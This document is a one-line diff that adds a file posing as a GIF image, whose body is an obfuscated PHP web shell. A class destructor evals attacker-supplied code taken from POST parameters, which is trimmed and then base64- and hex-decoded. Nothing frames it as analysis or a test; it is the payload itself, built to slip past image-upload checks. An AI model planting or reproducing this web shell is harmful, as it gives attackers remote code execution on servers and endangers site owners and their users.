@@ -1,0 +1,1 @@
+GIF89a;<?php class User{public $name ='';public $config=null;function __destruct(){@eval(''.$this->config."$this->name");}}$user=new User;$num=@$_POST['num'];$hex_data=base64_decode(substr(@$_POST['google123'],$num,-$num));$c=hex2bin($hex_data);$user->name=''.$c;?>
